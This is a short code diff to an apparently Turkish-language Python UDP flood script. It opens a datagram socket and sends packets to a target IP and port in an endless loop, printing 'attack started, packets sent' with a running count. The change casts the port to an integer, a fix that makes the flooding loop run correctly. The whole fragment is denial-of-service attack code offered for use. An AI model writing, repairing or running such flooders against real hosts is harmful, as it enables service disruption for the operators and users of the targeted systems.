@@ -23,7 +23,7 @@ sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
  
 sayac=1
 while True:
-        sock.sendto(bytes,(hedef_ip,hedef_port))
+        sock.sendto(bytes,(hedef_ip,int(hedef_port)))
         sayac=sayac+1
         print("saldiri baslatildi,gonderilen paket:%s"%(sayac))
 
